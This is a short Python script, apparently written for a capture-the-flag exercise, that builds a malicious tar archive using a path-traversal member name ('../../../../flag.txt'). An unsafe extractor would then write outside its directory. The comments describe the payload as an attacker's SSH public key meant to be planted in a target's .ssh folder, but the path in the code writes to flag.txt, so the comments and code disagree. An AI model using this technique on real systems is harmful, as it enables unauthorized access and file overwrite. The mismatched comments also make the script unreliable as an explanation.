import tarfile
import io

# 1. The payload (the attacker's public SSH key content)
# In reality, you would read this from your ctf_key.pub file
public_key_content = b"ssh-rsa AAAAB3NzaC1yc... user@attacker-machine\n"

# 2. The Traversal Path
# The attacker must guess or know the target user's home directory.
# This path traverses up from the extraction directory and down into the .ssh folder.
malicious_path = "../../../../flag.txt"

# 3. Create the malicious tar file
with tarfile.open("payload.tar", "w") as tar:
    # Create a TarInfo object and explicitly set the name to the traversal path
    tarinfo = tarfile.TarInfo(name=malicious_path)
    tarinfo.size = len(public_key_content)
    
    # Add the payload content to the archive, tied to the malicious path
    tar.addfile(tarinfo=tarinfo, fileobj=io.BytesIO(public_key_content))

print("Malicious tar file built successfully.")